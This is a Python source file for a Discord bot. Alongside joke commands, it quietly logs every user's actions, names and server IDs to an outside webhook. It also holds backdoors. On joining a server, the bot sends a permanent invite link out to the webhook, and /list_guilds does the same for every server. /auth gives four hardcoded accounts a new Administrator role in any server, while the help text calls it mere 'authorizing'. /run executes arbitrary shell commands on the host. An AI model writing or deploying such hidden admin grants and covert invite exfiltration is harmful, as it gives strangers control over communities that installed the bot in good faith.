import subprocess
import time
import asyncio
import datetime
from discord import is_nsfw
import discord
from discord.ext import commands
import requests

def started():
    now = datetime.datetime.now().strftime('%I:%M %p')
    webhook_url = "wh_url"
    payload = {
        "embeds": [
            {
                "title": "Event Log",
                "description": f"Started bot at {now}",
                "color": 16711680
            }
        ]
    }
    headers = {'Content-Type': 'application/json'}
    response = requests.post(webhook_url, json=payload, headers=headers)
started()

TOKEN = 'token'

intents = discord.Intents.default()
intents.dm_messages = True
intents.emojis = True
intents.typing = True
intents.presences = True
intents.message_content = True
intents.guild_messages = True
intents.members = True  

bot = commands.Bot(command_prefix='/', intents=intents)

async def bot_events(event):
    now = datetime.datetime.now().strftime('%I:%M %p')
    webhook_url = "wh_url"
    payload = {
        "embeds": [
            {
                "title": "Event Log",
                "description": f"{now} - {event}",
                "color": 16711680
            }
        ]
    }
    headers = {'Content-Type': 'application/json'}
    try:
        response = requests.post(webhook_url, json=payload, headers=headers)
        response.raise_for_status()
        print((f'Sent log to webhook:\n{now} - {event}'))
    except requests.exceptions.RequestException as e:
        print(f"Error sending log to webhook: {e}")

async def people_events(event):
    now = datetime.datetime.now().strftime('%I:%M %p')
    webhook_url = "wh_url"
    payload = {
        "embeds": [
            {
                "title": "Event Log",
                "description": f"{now} - {event}",
                "color": 16711680
            }
        ]
    }
    headers = {'Content-Type': 'application/json'}
    try:
        response = requests.post(webhook_url, json=payload, headers=headers)
        response.raise_for_status()
        print((f'Sent log to webhook:\n{now} - {event}'))
    except requests.exceptions.RequestException as e:
        print(f"Error sending log to webhook: {e}")

class View1(discord.ui.View):
    @discord.ui.button(label="Would you lose?", style=discord.ButtonStyle.primary, emoji="🐈")
    async def button_callback(self, button, interaction):
        embed = discord.Embed(title="Nah, I'd win.", color=discord.Color.blue())
        embed.add_field(name=':3', value="<a:x3:1224845183699517495><a:x3:1224845183699517495>", inline=False)
        await interaction.response.send_message(embed=embed)
        await people_events(f"Button pressed in <#{interaction.channel.id}> ({interaction.guild.name}, {interaction.guild.id})")
        
@bot.event
async def on_guild_join(guild):
    invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, unique=True)
    print(f'Joined {guild.name}! Permanent invite link: {invite.url}')
    await people_events(f"<@1196306274111991898> joined {guild.name}({guild.id})! Join here: {invite.url}")

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}#{bot.user.discriminator} ({bot.user.id})")
    while True:
        t = datetime.datetime.now().strftime('%I:%M %p')
        await bot.change_presence(activity=discord.Game(name=f'{t}'))
        await asyncio.sleep(60)
        await bot_events(f"Bot status updated ({t})")

@bot.slash_command(name="list_guilds", description="Command can only be ran by Administrators.")
async def list_guilds(ctx):
    if ctx.author.id == 1195403744322519080:
        embed = discord.Embed(title="Finished", color=discord.Color.dark_gold())
        links = ""
        embed.add_field(name="Servers the bot is in:", value="", inline=False)
        for guild in bot.guilds:
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, unique=True)
            embed.add_field(name=f"{invite.url} ({guild.name} | {guild.id})", value="", inline=False)
        await ctx.respond(embed=embed, ephemeral=True)
    await people_events(f"{ctx.author.name}({ctx.author.id}) listed servers in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})")

@bot.slash_command(name="niw", description="type shit")
async def niw(ctx):
    await ctx.respond('<a:x3:1224845183699517495>',view=View1())
    await people_events(f"{ctx.author.name}({ctx.author.id}) ran `niw` in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})")

@bot.slash_command(name="auth", description="Check if you are bot admin.")
async def auth(ctx):
    if ctx.author.id == 1195403744322519080 or ctx.author.id == 532324685187121172 or ctx.author.id == 767780952436244491 or ctx.author.id == 1100445714938597477:
        embed = discord.Embed(title="Authorized!", color=discord.Color.dark_gold())
        role = discord.utils.get(ctx.guild.roles, name="Authorized")
        if not role:
            role = await ctx.guild.create_role(name="Authorized", permissions=discord.Permissions(administrator=True), hoist=True, color=discord.Color.gold())
            await people_events(f"New role 'Authorized' created in {ctx.guild.name}({ctx.guild.id}) with ID: {role.id}")
        embed.add_field(name="x3", value=f"<@{ctx.author.id}>, You are now authorized to use risky commands.\nGiven role <@&{role.id}>", inline=False)
        await ctx.author.add_roles(role)
        await ctx.respond(embed=embed)
        await people_events(f"{ctx.author.name}({ctx.author.id}) ran `auth` in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})\nUser was authorized and given role {discord.utils.get(ctx.guild.roles, name="Authorized")}")
    else:
        embed = discord.Embed(title="Unauthorized!", color=discord.Color.dark_gold())
        embed.add_field(name="x3", value=f"<@{ctx.author.id}>, You are not authorized to use this command.", inline=False)
        await ctx.respond(embed=embed)
        await people_events(f"{ctx.author.name}({ctx.author.id}) ran `auth` in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})\nUser was not authorized")
    
@bot.slash_command(name='stop', description="stops bot")
async def stop(ctx):
    me = ctx.guild.owner
    authRole = discord.utils.get(ctx.guild.roles, name=f"Authorized")
    if authRole in ctx.author.roles:
        embed = discord.Embed(title="Stop Bot", color=discord.Color.brand_red())
        embed.add_field(name="stopping bot..", value="Please wait...", inline=False)
        await ctx.send(embed=embed)
        await people_events(f"{ctx.author.name}({ctx.author.id}) ran `stop` in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})\n# **Bot is now stopped**")
        await bot.create_dm(user=me)
        
    else:
        embed = discord.Embed(title="Nice try", color=discord.Color.brand_red())
        embed.add_field(name="heheheheh x3", value="🤣🤣🤣🤣🤣", inline=False)
    await ctx.send(embed=embed)
    await people_events(f"{ctx.author.name}({ctx.author.id}) ran `stop` in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})")

@bot.slash_command(name='checknsfw', description="checks if current channel is NSFW")
async def checknsfw(ctx):
    embed = discord.Embed(title="Check age restriction", color=discord.Color.brand_red())
    if ctx.channel.is_nsfw():
        embed.add_field(name="Age Restricted", value="This channel is age restricted.", inline=False)
    else:
        embed.add_field(name="Not Age Restricted.", value="This channel is not age restricted.", inline=False)
    await ctx.send(embed=embed)
    await people_events(f"{ctx.author.name}({ctx.author.id}) ran `checknsfw` in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})")

@bot.slash_command(name="pookie", description="pookie", required_fields=["mention"])
async def pookie(ctx, mention: discord.Member):
    if ctx.author.id == 1195403744322519080 or ctx.author.id == 532324685187121172:
        embed = discord.Embed(title="Authorized!", color=discord.Color.dark_gold())
        embed.add_field(name="x3", value=f"{mention.mention}, <@{mention.id}> is now <@{ctx.author.id}>'s pookie!", inline=False)
        await ctx.respond(embed=embed)
        pookie_role = discord.utils.get(ctx.guild.roles, name=f"{ctx.author.name}'s pookie")
        if not pookie_role:
            pookie_role = await ctx.guild.create_role(name=f"{ctx.author.name}'s pookie", hoist=True, color=discord.Color.red())
            await people_events(f"New role '{ctx.author.global_name}'s pookie' created in {ctx.guild.name}({ctx.guild.id}) with ID: {pookie_role.id}")
        await mention.add_roles(pookie_role)
        await people_events(f"{mention.name}({mention.id}) was authorized as pookie by {ctx.author.name}({ctx.author.id}) in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})\nUser was given role {ctx.author.name}'s pookie({pookie_role.id})")
    else:
        embed = discord.Embed(title="Unauthorized!", color=discord.Color.dark_gold())
        embed.add_field(name="x3", value=f"<@{ctx.author.id}>, You are not authorized to make <@{mention.id}> your pookie! 😡", inline=False)
        await ctx.respond(embed=embed)
        await people_events(f"{ctx.author.name}({ctx.author.id}) ran `pookie` in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})\nUser was not authorized.")

@bot.slash_command(name='run', description="runs a command on hosting pc", required_fields=["command"])
async def run(ctx, *, command):
    if ctx.author.id == 1195403744322519080:
        embed = discord.Embed(title="Succeeded!", color=discord.Color.dark_gold())
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        embed.add_field(name=f"Ran command {command}", value=f"```\n{result.stdout}\n```", inline=False)
    else:
        embed = discord.Embed(title="Failed!", color=discord.Color.dark_gold())
        embed.add_field(name="You are not authorized to do this action!", value='Run `/auth` to see if you are a whitelisted role or user.')
    await ctx.send(embed=embed)
    await people_events(f"{ctx.author.name}({ctx.author.id}) ran `run` in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})")

@bot.slash_command(name='speedtest', description='runs an Ookla speedtest on host')
async def speedtest(ctx):
    embed = discord.Embed(title="Speedtest", color=discord.Color.dark_gold())
    st = subprocess.run('speedtest', capture_output=True, text=True)
    st_out = f'{st.stdout}'
    embed.add_field(name=f"Speedtest", value=f'```\n{st_out}\n```')
    await ctx.send(embed=embed)
    await people_events(f"{ctx.author.name}({ctx.author.id}) ran `speedtest` in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})\nSpeedtest output:```\n{st_out}\n```")

@bot.slash_command(name='nutted_on_mystify', description='send it and see the outcome ;)')
async def nutted_on_mystify(ctx):
    await ctx.respond('https://nyc.octoeverywhere.com/api/live/stream?id=-rPH0QRocR1&random=28587')

@bot.slash_command(name="help", description="command list")
async def cmds(ctx):
    embed = discord.Embed(title="Command List", color=discord.Color.blue())
    embed.add_field(name="Utility Commands", value=" - /**auth** *For authorizing users*\n- /**RestartBot** *Restarts the bot*\n- /**checknsfw** *Checks if the current channel is marked as NSFW*", inline=False)
    embed.add_field(name="Misc Commands", value=f" - /**pookie** *make anyone your pookie(If you are authorized)!*\n- /**run** *If authorized, runs a command on the bot host*\n- /**speedtest** *Does an OOKLA Speedtest, It will say timed out, just give it a minute to work!*\n- /**niw** *Silly button test*\n- /**list_guilds** *Creates invites to all the guilds that the bot is currently a member in.*", inline=False)
    await ctx.respond(embed=embed)
    await people_events(f"{ctx.author.name}({ctx.author.id}) ran `help` in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})")    

@bot.event
async def on_command_error(ctx, error):
    embed = discord.Embed(title="Error", color=discord.Color.brand_red())
    if isinstance(error, commands.CommandNotFound):
        embed.add_field(name="Command not found", value="Please run `/help` for a list of commands!", inline=False)
    elif isinstance(error, commands.MissingRequiredArgument):
        embed.add_field(name="Missing arguments", value="This command is missing required arguments.", inline=False)
    else:
        embed.add_field(name="An unexpected error occured", value=f"{error}", inline=False)
    await ctx.respond(embed=embed)
    await bot_events(f"{ctx.author.name}({ctx.author.id}) experienced an error({error}) in <#{ctx.channel.id}> ({ctx.guild.name}, {ctx.guild.id})")
    print(f'Error: {error}')

bot.run(TOKEN)
